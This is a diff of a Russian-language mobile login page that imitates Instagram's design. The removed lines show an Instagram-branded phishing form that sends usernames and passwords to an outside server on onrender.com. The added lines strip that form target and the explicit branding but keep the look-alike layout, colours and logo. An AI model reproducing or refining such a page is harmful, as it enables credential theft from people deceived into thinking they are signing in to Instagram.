@@ -2,44 +2,55 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Instagram</title>
+<meta name="viewport"
+content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
 
-<link rel="icon"
-href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+<title>Mobile Login</title>
 
 <style>
 
- 
-/*------------------------------------------------------------------*/
+/* RESET */
 *{
     margin:0;
     padding:0;
     box-sizing:border-box;
 }
 
+/* FULLSCREEN + NO SCROLL */
+html,
+body{
+    width:100%;
+    height:100%;
+    overflow:hidden;
+    position:fixed;
+    touch-action:none;
+    overscroll-behavior:none;
+    -webkit-overflow-scrolling:none;
+}
+
+/* BODY */
 body{
     background:#0A0C0F;
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",
-    Roboto,Helvetica,Arial,sans-serif;
-    min-height:100vh;
+    font-family:-apple-system,BlinkMacSystemFont,
+    "Segoe UI",Roboto,Helvetica,Arial,sans-serif;
     color:white;
 }
 
-/* MAIN */
+/* MAIN CONTAINER */
 .container{
-    width:100%;
-    min-height:100vh;
+    width:100vw;
+    height:100vh;
     display:flex;
     justify-content:center;
     align-items:center;
-    padding:20px;
+    padding:24px;
 }
 
-/* LOGIN BLOCK */
+/* LOGIN BOX */
 .login-box{
     width:100%;
-    max-width:420px;
+    max-width:380px;
+    height:100%;
     display:flex;
     flex-direction:column;
     align-items:center;
@@ -47,17 +58,18 @@ body{
 
 /* LANGUAGE */
 .language{
-    color:rgba(255,255,255,0.75);
+    margin-top:12px;
     font-size:15px;
-    margin-bottom:70px;
+    color:rgba(255,255,255,0.75);
 }
 
 /* LOGO */
 .logo{
-    width:82px;
-    height:82px;
-    object-fit:contain;
+    width:86px;
+    height:86px;
+    margin-top:70px;
     margin-bottom:60px;
+    object-fit:contain;
 }
 
 /* FORM */
@@ -65,121 +77,96 @@ form{
     width:100%;
 }
 
+/* INPUTS */
 .input-box{
     width:100%;
-    margin-bottom:14px;
+    margin-bottom:12px;
 }
 
 input{
     width:100%;
-    height:64px;
-    border-radius:16px;
-    border:1px solid rgba(255,255,255,0.15);
-    background:transparent;
-    padding:0 18px;
-    font-size:17px;
+    height:52px;
+    background:rgba(255,255,255,0.05);
+    border:1px solid rgba(255,255,255,0.14);
+    border-radius:14px;
+    padding:0 16px;
     color:white;
+    font-size:16px;
     outline:none;
 }
 
 input::placeholder{
-    color:rgba(255,255,255,0.55);
+    color:#9aa0a6;
 }
 
 input:focus{
-    border-color:#3797ff;
+    border-color:#0095f6;
 }
 
-/* LOGIN BUTTON */
+/* BUTTON */
 button{
     width:100%;
-    height:58px;
+    height:52px;
     border:none;
-    border-radius:18px;
+    border-radius:999px;
     background:#0095f6;
     color:white;
-    font-size:20px;
+    font-size:17px;
     font-weight:600;
-    margin-top:6px;
+    margin-top:8px;
     cursor:pointer;
 }
 
 /* FORGOT */
 .forgot{
-    margin-top:28px;
-    text-decoration:none;
+    margin-top:24px;
     color:white;
-    font-size:16px;
+    text-decoration:none;
+    font-size:15px;
 }
 
 /* BOTTOM */
 .bottom{
+    margin-top:auto;
     width:100%;
-    margin-top:120px;
     display:flex;
     flex-direction:column;
     align-items:center;
+    padding-bottom:26px;
 }
 
 /* CREATE ACCOUNT */
 .create-account{
     width:100%;
-    height:58px;
-    border:1px solid #3797ff;
-    border-radius:18px;
+    height:52px;
+    border:1px solid #0095f6;
+    border-radius:999px;
     display:flex;
     align-items:center;
     justify-content:center;
-    color:#3797ff;
     text-decoration:none;
-    font-size:18px;
-    font-weight:500;
+    color:#0095f6;
+    font-size:16px;
+    font-weight:600;
 }
 
 /* META */
 .meta{
-    margin-top:34px;
-    color:white;
-    opacity:0.8;
-    font-size:18px;
-    display:flex;
-    align-items:center;
-    gap:6px;
+    margin-top:28px;
+    color:#a8a8a8;
+    font-size:15px;
 }
 
-/* MOBILE */
-@media(max-width:600px){
-
-    .container{
-        padding:24px;
-    }
-
-    .login-box{
-        max-width:100%;
-    }
-
-    .language{
-        margin-bottom:60px;
-    }
+/* MOBILE FIX */
+@media(max-height:700px){
 
     .logo{
-        width:84px;
-        height:84px;
-        margin-bottom:70px;
-    }
-
-    input{
-        height:62px;
-        font-size:16px;
-    }
-
-    button{
-        height:58px;
-        font-size:18px;
+        margin-top:40px;
+        margin-bottom:40px;
     }
 
     .bottom{
-        margin-top:140px;
+        padding-bottom:18px;
     }
 
 }
@@ -193,29 +180,27 @@ button{
 
     <div class="login-box">
 
-        <div class="language">Русский</div>
+        <div class="language">
+            Русский
+        </div>
 
         <img
         src="https://cdn-icons-png.flaticon.com/512/5968/5968776.png"
         class="logo"
-        alt="Instagram">
+        alt="Logo">
 
-        <form action="https://insta-l177.onrender.com/" method="POST">
+        <form>
 
             <div class="input-box">
                 <input
                 type="text"
-                name="username"
-                placeholder="Имя пользователя, эл. адрес или номер телефона"
-                required>
+                placeholder="Имя пользователя, эл. адрес или номер телефона">
             </div>
 
             <div class="input-box">
                 <input
                 type="password"
-                name="password"
-                placeholder="Пароль"
-                required>
+                placeholder="Пароль">
             </div>
 
             <button type="submit">
